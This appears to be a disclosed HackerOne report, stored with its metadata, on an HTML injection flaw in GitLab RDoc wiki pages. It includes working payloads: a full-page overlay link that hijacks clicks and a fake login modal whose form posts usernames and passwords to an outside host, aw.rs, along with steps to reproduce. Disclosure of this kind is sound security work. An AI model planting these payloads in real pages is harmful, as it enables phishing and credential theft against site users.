---
title: "Stored XSS / HTML injection in GitLab RDoc wiki pages (unsanitized anchor attributes)"
url: "https://hackerone.com/reports/662287"
vuln_class: "Cross-site Scripting (XSS) - Stored"
tech: "GitLab, Ruby, RDoc, Markdown"
bounty: 3500
program: "GitLab"
severity: "high"
votes: 282
content_quality: "full"
source: "HackerOne disclosed report"
date: 2019-12-16
---

## Summary
When creating an RDoc wiki page it is possible to use many HTML tags and attributes that
are normally sanitized, via a linkable image of the form `{<img src>}[link]`.

## Root cause
When using an image link, anchor-tag attributes are not sanitized correctly. A `class`
attribute can be set, e.g.:

```rdoc
{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]
```

The `atwho-view select2-drop-mask pika-select` classes position the link absolutely with
a high z-index, so a full-page link can intercept clicks. The `target` attribute can also
be set to `_blank`; with no `rel="noopener"`, reverse tabnabbing is possible.

A more convincing attack is a fake login form in a modal:

```rdoc
a form
{
<div class="modal show d-block"><div class="modal-dialog"><div class="modal-content">
<div class="modal-header"><h3 class="page-title">Please Log In</h3></div>
<div class="modal-body"><form class="new-wiki-page" action="http://aw.rs/">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
<button name="button" type="submit" class="btn btn-success">Login</button>
</form></div></div></div></div>
}[/]
```

## Steps to reproduce
1. Create a wiki on GitLab.
2. Add a new RDoc page with the snippet above.
3. Save and wait for a victim to click.

## Impact
Trick users into thinking they clicked a GitLab element when they are redirected to an
attacker site, or present a dialog that posts credentials to an attacker site.
